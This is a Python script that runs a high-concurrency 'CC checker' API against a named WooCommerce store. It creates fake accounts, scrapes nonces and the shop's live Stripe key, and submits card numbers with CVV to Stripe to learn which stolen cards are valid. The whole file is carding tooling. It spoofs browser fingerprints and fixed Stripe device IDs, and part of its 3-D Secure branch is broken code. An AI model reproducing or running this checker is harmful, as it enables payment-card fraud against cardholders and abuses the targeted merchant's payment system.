#!/usr/bin/env python3
"""
HandToolEssentials.com Stripe Auth Checker API
Pydroid 3 Compatible | 400 Concurrent | EXACT String Format | No Limits
"""

import asyncio
import aiohttp
import json
import random
import re
import string
import time
import uuid
from datetime import datetime
from typing import Dict, Optional
import sys
import socket
from aiohttp import web

# ========== CONFIGURATION ==========
CONFIG = {
    "domain": "handtoolessentials.com",
    "max_concurrent": 400,
    "port": 8000,
    "stripe_key": "pk_live_5ZSl1RXFaQ9bCbELMfLZxCsG",
    "guid": "42545704-d6b5-43d2-9f19-24a7ce72b47c2d705d",
    "muid": "44a41e0c-183d-4d5c-ad87-b8056045ebe0690896"
}

# ========== HELPER FUNCTIONS ==========

def generate_email() -> str:
    """Generate random email for registration."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'

def generate_password() -> str:
    """Generate random password for registration."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits + string.ascii_uppercase, k=12))

def generate_client_session_id() -> str:
    """Generate random client session ID."""
    return str(uuid.uuid4())

def generate_elements_session_config_id() -> str:
    """Generate random elements session config ID."""
    return str(uuid.uuid4())

def generate_sid() -> str:
    """Generate random sid."""
    return str(uuid.uuid4()).replace('-', '')[:20] + str(random.randint(10000, 99999))

def parse_cc_line(cc_string: str) -> Optional[Dict]:
    """Parse card from various formats."""
    cc_string = cc_string.strip()
    if not cc_string:
        return None
    
    # Remove spaces
    cc_string = cc_string.replace(' ', '')
    
    # Try different separators
    for sep in ['|', ':', ';', '/', '-', ' ']:
        if sep in cc_string:
            parts = [p.strip() for p in cc_string.split(sep) if p.strip()]
            if len(parts) >= 4:
                card_num = None
                month = None
                year = None
                cvv = None
                
                for part in parts:
                    if re.match(r'^\d{15,16}$', part) and not card_num:
                        card_num = part
                    elif re.match(r'^\d{1,2}$', part) and not month:
                        month = part.zfill(2)
                    elif re.match(r'^\d{2,4}$', part) and not year:
                        year = part[-2:] if len(part) > 2 else part
                    elif re.match(r'^\d{3,4}$', part) and not cvv:
                        cvv = part
                
                if card_num and month and year and cvv:
                    return {
                        "number": card_num,
                        "month": month,
                        "year": year,
                        "cvv": cvv,
                        "formatted": f"{card_num}|{month}|{year}|{cvv}"
                    }
    
    # Check if it's already in pipe format
    if re.match(r'^\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc_string):
        parts = cc_string.split('|')
        return {
            "number": parts[0],
            "month": parts[1].zfill(2),
            "year": parts[2][-2:] if len(parts[2]) > 2 else parts[2],
            "cvv": parts[3],
            "formatted": cc_string
        }
    
    return None

# ========== STRIPE CHECKER ==========

class HandToolsChecker:
    def __init__(self, domain: str):
        self.domain = domain
        self.session = None
        self.headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        }
    
    async def __aenter__(self):
        """Create session with cookie jar."""
        conn = aiohttp.TCPConnector(
            limit=0,
            limit_per_host=0,
            ttl_dns_cache=300,
            force_close=False,
            enable_cleanup_closed=True
        )
        self.session = aiohttp.ClientSession(connector=conn)
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    def _parse_value(self, data: str, start: str, end: str) -> str:
        """Extract value between start and end strings."""
        try:
            start_pos = data.index(start) + len(start)
            end_pos = data.index(end, start_pos)
            return data[start_pos:end_pos]
        except ValueError:
            return "None"
    
    async def get_register_nonce(self) -> Optional[str]:
        """Extract woocommerce-register-nonce."""
        try:
            url = f"https://{self.domain}/my-account/"
            async with self.session.get(url, headers=self.headers, timeout=15) as res:
                html = await res.text()
                try:
                    return html.split('woocommerce-register-nonce" value="')[1].split('"')[0]
                except:
                    return None
        except Exception:
            return None
    
    async def register_account(self, email: str, password: str, nonce: str) -> bool:
        """Register with email and password."""
        try:
            url = f"https://{self.domain}/my-account/"
            
            post_headers = self.headers.copy()
            post_headers.update({
                "content-type": "application/x-www-form-urlencoded",
                "origin": f"https://{self.domain}",
                "referer": f"https://{self.domain}/my-account/",
            })
            
            data = {
                "email": email,
                "password": password,
                "woocommerce-register-nonce": nonce,
                "_wp_http_referer": "/my-account/",
                "register": "Register"
            }
            
            async with self.session.post(url, headers=post_headers, data=data, timeout=15) as res:
                html = await res.text()
                return 'logout' in html.lower() or 'dashboard' in html.lower()
        except Exception:
            return False
    
    async def get_stripe_key(self) -> Optional[str]:
        """Extract Stripe publishable key."""
        try:
            url = f"https://{self.domain}/my-account/add-payment-method/"
            async with self.session.get(url, headers=self.headers, timeout=15) as res:
                html = await res.text()
                match = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', html)
                return match.group(0) if match else CONFIG["stripe_key"]
        except Exception:
            return CONFIG["stripe_key"]
    
    async def get_setup_intent_nonce(self) -> Optional[str]:
        """Extract createAndConfirmSetupIntentNonce."""
        try:
            url = f"https://{self.domain}/my-account/add-payment-method/"
            async with self.session.get(url, headers=self.headers, timeout=15) as res:
                html = await res.text()
                
                # Exact method from aus.py
                nonce = self._parse_value(html, '"createAndConfirmSetupIntentNonce":"', '"')
                
                if nonce and nonce != "None":
                    return nonce
                
                # Try alternate pattern
                if not nonce or nonce == "None":
                    match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html)
                    if match:
                        return match.group(1)
                
                return None
        except Exception:
            return None
    
    async def create_payment_method(self, stripe_key: str, card_number: str, exp_month: str, exp_year: str, cvv: str, email: str = None) -> Optional[str]:
        """Create Stripe payment method with EXACT string format from working example."""
        try:
            url = "https://api.stripe.com/v1/payment_methods"
            
            stripe_headers = {
                "authority": "api.stripe.com",
                "accept": "application/json",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/",
                "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "user-agent": self.headers["user-agent"]
            }
            
            card_number = card_number.replace(' ', '')
            exp_year = exp_year[-2:] if len(exp_year) > 2 else exp_year
            
            # Generate dynamic values
            client_session_id = generate_client_session_id()
            elements_session_config_id = generate_elements_session_config_id()
            sid = generate_sid()
            time_on_page = random.randint(20000, 30000)
            
            # Build EXACT string format from working example
            data_string = (
                f"type=card&"
                f"card[number]={card_number}&"
                f"card[cvc]={cvv}&"
                f"card[exp_year]={exp_year}&"
                f"card[exp_month]={exp_month}&"
                f"allow_redisplay=unspecified&"
                f"billing_details[address][postal_code]=10080&"
                f"billing_details[address][country]=US&"
                f"payment_user_agent=stripe.js%2Fd68d8e2c5f%3B+stripe-js-v3%2Fd68d8e2c5f%3B+payment-element%3B+deferred-intent&"
                f"referrer=https%3A%2F%2F{self.domain}&"
                f"time_on_page={time_on_page}&"
                f"client_attribution_metadata[client_session_id]={client_session_id}&"
                f"client_attribution_metadata[merchant_integration_source]=elements&"
                f"client_attribution_metadata[merchant_integration_subtype]=payment-element&"
                f"client_attribution_metadata[merchant_integration_version]=2021&"
                f"client_attribution_metadata[payment_intent_creation_flow]=deferred&"
                f"client_attribution_metadata[payment_method_selection_flow]=merchant_specified&"
                f"client_attribution_metadata[elements_session_config_id]={elements_session_config_id}&"
                f"client_attribution_metadata[merchant_integration_additional_elements][0]=payment&"
                f"guid={CONFIG['guid']}&"
                f"muid={CONFIG['muid']}&"
                f"sid={sid}&"
                f"key={stripe_key}&"
                f"_stripe_version=2024-06-20"
            )
            
            # Add email if provided
            if email:
                data_string += f"&billing_details[email]={email}"
            
            async with self.session.post(url, headers=stripe_headers, data=data_string, timeout=20) as res:
                response_text = await res.text()
                
                if res.status == 200:
                    try:
                        response = json.loads(response_text)
                        return response.get('id')
                    except:
                        return None
                else:
                    # Try to get error message
                    try:
                        error_data = json.loads(response_text)
                        error_msg = error_data.get('error', {}).get('message', 'Unknown')
                        print(f"⚠️ Stripe error: {error_msg}")
                    except:
                        pass
                    return None
        except Exception as e:
            print(f"❌ Payment method error: {e}")
            return None
    
    async def confirm_setup_intent(self, payment_method_id: str, nonce: str) -> dict:
        """Confirm setup intent."""
        try:
            url = f"https://{self.domain}/wp-admin/admin-ajax.php"
            
            ajax_headers = {
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": f"https://{self.domain}",
                "referer": f"https://{self.domain}/my-account/add-payment-method/",
                "user-agent": self.headers["user-agent"],
                "x-requested-with": "XMLHttpRequest"
            }
            
            data_string = f"action=wc_stripe_create_and_confirm_setup_intent&wc-stripe-payment-method={payment_method_id}&wc-stripe-payment-type=card&_ajax_nonce={nonce}"
            
            async with self.session.post(url, headers=ajax_headers, data=data_string, timeout=20) as res:
                response_text = await res.text()
                try:
                    return json.loads(response_text)
                except:
                    return {"success": False, "error": "Failed to parse response"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    async def check_card(self, card_string: str) -> dict:
        """Complete card checking flow."""
        start_time_val = time.time()
        email = generate_email()
        password = generate_password()
        
        try:
            # Step 1: Get register nonce
            register_nonce = await self.get_register_nonce()
            if not register_nonce:
                return {
                    "cc": card_string[:6] + "..." + card_string[-4:],
                    "status": "ERROR",
                    "code": "REGISTER_NONCE_ERROR",
                    "live": False,
                    "time": int((time.time() - start_time_val) * 1000)
                }
            
            # Step 2: Register account
            registered = await self.register_account(email, password, register_nonce)
            if not registered:
                return {
                    "cc": card_string[:6] + "..." + card_string[-4:],
                    "status": "ERROR",
                    "code": "REGISTER_FAILED",
                    "live": False,
                    "time": int((time.time() - start_time_val) * 1000)
                }
            
            # Step 3: Get Stripe key
            stripe_key = await self.get_stripe_key()
            
            # Step 4: Parse card
            parts = card_string.split('|')
            card_number, exp_month, exp_year, cvv = parts
            
            # Step 5: Create payment method with EXACT string format
            pm_id = await self.create_payment_method(stripe_key, card_number, exp_month, exp_year, cvv, email)
            if not pm_id:
                return {
                    "cc": card_string[:6] + "..." + card_string[-4:],
                    "status": "ERROR",
                    "code": "PAYMENT_METHOD_FAILED",
                    "live": False,
                    "time": int((time.time() - start_time_val) * 1000)
                }
            
            # Step 6: Get setup nonce
            setup_nonce = await self.get_setup_intent_nonce()
            if not setup_nonce:
                return {
                    "cc": card_string[:6] + "..." + card_string[-4:],
                    "status": "ERROR",
                    "code": "SETUP_NONCE_ERROR",
                    "live": False,
                    "time": int((time.time() - start_time_val) * 1000)
                }
            
            # Step 7: Confirm setup intent
            result = await self.confirm_setup_intent(pm_id, setup_nonce)
            
            # Step 8: Parse result
            success = result.get('success', False)
            
            if success:
                if result.get('status',' ')== 'succeeded':
                    return {
	                    "cc": card_string[:6] + "..." + card_string[-4:],
	                    "status": "APPROVED",
	                    "code": "CARD_VALID",
	                    "live": True,
	                    "pm_id": pm_id[:10] + "..." + pm_id[-6:] if pm_id else None,
	                    "time": int((time.time() - start_time_val) * 1000)
	                }
                else:
                	try:
	                	if result.get('status',' ') == 'requires_action':
	                		id = data.get('id')
	                		cs = data.get('client_secret')
	                		headers = {
							    'authority': 'api.stripe.com',
							    'accept': 'application/json',
							    'content-type': 'application/x-www-form-urlencoded',
							    'origin': 'https://js.stripe.com',
							    'referer': 'https://js.stripe.com/',
							    'user-agent': self.headers["user-agent"],
							}
	                		client_session_id = generate_client_session_id()
	                		data = f'use_stripe_sdk=true&mandate_data[customer_acceptance][type]=online&mandate_data[customer_acceptance][online][infer_from_client]=true&key={stripe_key}&_stripe_version=2024-06-20&client_attribution_metadata[client_session_id]={client_session_id}&client_attribution_metadata[merchant_integration_source]=l1&client_secret={cs}'
	                		async with self.session.post(f'https://api.stripe.com/v1/setup_intents/{id}/confirm', headers=headers, data=data, timeout=20) as res:
	                			r = await res.text
	                			result = json.loads(r)
	                			print(result)
	                			try:
	                				if result.get('error').get('code') == 'card_declined':
	                					return {
						                    "cc": card_string[:6] + "..." + card_string[-4:],
						                    "status": "DECLINED",
						                    "code": result.get('error').get('code'),
						                    "live": False,
						                    "time": int((time.time() - start_time_val) * 1000)
						                }
	                			except:
	                				return {
					                    "cc": card_string[:6] + "..." + card_string[-4:],
					                    "status": "APPROVED",
					                    "code": "CARD_VALID",
					                    "live": True,
					                    "pm_id": pm_id[:10] + "..." + pm_id[-6:] if pm_id else None,
					                    "time": int((time.time() - start_time_val) * 1000)
					                }
	                	else:
	                		return {
			                    "cc": card_string[:6] + "..." + card_string[-4:],
			                    "status": "APPROVED",
			                    "code": "CARD_VALID",
			                    "live": True,
			                    "pm_id": pm_id[:10] + "..." + pm_id[-6:] if pm_id else None,
			                    "time": int((time.time() - start_time_val) * 1000)
			                }
                	except:
                		return {
		                    "cc": card_string[:6] + "..." + card_string[-4:],
		                    "status": "APPROVED",
		                    "code": "CARD_VALID",
		                    "live": True,
		                    "pm_id": pm_id[:10] + "..." + pm_id[-6:] if pm_id else None,
		                    "time": int((time.time() - start_time_val) * 1000)
		                }
            else:
                error_code = "CARD_DECLINED"
                error_msg = json.dumps(result).lower()
                
                if 'insufficient_funds' in error_msg:
                    error_code = "INSUFFICIENT_FUNDS"
                elif 'invalid_cvc' in error_msg:
                    error_code = "INVALID_CVC"
                elif 'expired_card' in error_msg:
                    error_code = "EXPIRED_CARD"
                elif 'incorrect_number' in error_msg:
                    error_code = "INCORRECT_NUMBER"
                
                return {
                    "cc": card_string[:6] + "..." + card_string[-4:],
                    "status": "DECLINED",
                    "code": error_code,
                    "live": False,
                    "time": int((time.time() - start_time_val) * 1000)
                }
            
        except Exception as e:
            return {
                "cc": card_string[:6] + "..." + card_string[-4:],
                "status": "ERROR",
                "code": "CHECK_ERROR",
                "error": str(e)[:50],
                "live": False,
                "time": int((time.time() - start_time_val) * 1000)
            }

# ========== API HANDLERS ==========

semaphore = asyncio.Semaphore(CONFIG["max_concurrent"])

async def check_cc_handler(request):
    """Handle /check?cc=... requests with high concurrency."""
    cc_param = request.query.get('cc', '')
    
    if not cc_param:
        return web.json_response({
            "error": "Missing cc parameter",
            "usage": "/check?cc=4111111111111111|12|25|123"
        }, status=400)
    
    # Parse card
    parsed_card = parse_cc_line(cc_param)
    if not parsed_card:
        return web.json_response({
            "error": "Invalid card format",
            "example": "4111111111111111|12|25|123"
        }, status=400)
    
    # Use semaphore for concurrency control
    async with semaphore:
        try:
            async with HandToolsChecker(CONFIG["domain"]) as checker:
                result = await checker.check_card(parsed_card["formatted"])
                return web.json_response(result)
        except Exception as e:
            return web.json_response({
                "cc": cc_param[:6] + "..." + cc_param[-4:],
                "status": "ERROR",
                "code": "API_ERROR",
                "error": str(e)[:50],
                "live": False,
                "time": 0
            }, status=500)

async def health_handler(request):
    """Simple health check endpoint."""
    return web.json_response({
        "status": "online",
        "service": "HandTools CC Checker API",
        "version": "2.0 - EXACT String Format",
        "max_concurrent": CONFIG["max_concurrent"],
        "active_requests": CONFIG["max_concurrent"] - semaphore._value if hasattr(semaphore, '_value') else 0
    })

async def root_handler(request):
    """Root endpoint with instructions."""
    return web.json_response({
        "name": "HandTools Essentials CC Checker API",
        "version": "2.0",
        "features": [
            "EXACT string format from working example",
            "Full Stripe payment method tokenization",
            "400 concurrent requests",
            "No file storage"
        ],
        "endpoints": {
            "/check?cc={card}": "Check single credit card (supports multiple formats)",
            "/health": "Check API status"
        },
        "examples": {
            "pipe": "/check?cc=4111111111111111|12|25|123",
            "space": "/check?cc=4111111111111111 12 25 123",
            "colon": "/check?cc=4111111111111111:12:25:123"
        },
        "concurrency": f"Up to {CONFIG['max_concurrent']} simultaneous checks"
    })

# ========== MAIN ==========

async def main():
    """Start the API server."""
    print("\033[96m\033[1m")
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║         HANDTOOLESSENTIALS.COM CC CHECKER API                ║")
    print("║         EXACT String Format | 400 Concurrent                ║")
    print("║         Working Tokenization | No Limits                    ║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print("\033[0m")
    
    # Get local IP for network access
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    
    # Setup app
    app = web.Application()
    app.router.add_get('/', root_handler)
    app.router.add_get('/check', check_cc_handler)
    app.router.add_get('/health', health_handler)
    
    print(f"\033[92m✅ Server started successfully!\033[0m")
    print(f"\033[93m📱 Local: http://localhost:{CONFIG['port']}\033[0m")
    print(f"\033[93m🌐 Network: http://{local_ip}:{CONFIG['port']}\033[0m")
    print(f"\033[96m🚀 Max concurrent checks: {CONFIG['max_concurrent']}\033[0m")
    print(f"\033[92m📝 Using EXACT string format for tokenization\033[0m\n")
    
    # Start server
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', CONFIG["port"])
    await site.start()
    
    # Keep running
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\033[93m⚠️ Server stopped by user\033[0m")
    except Exception as e:
        print(f"\033[91m❌ Fatal error: {e}\033[0m")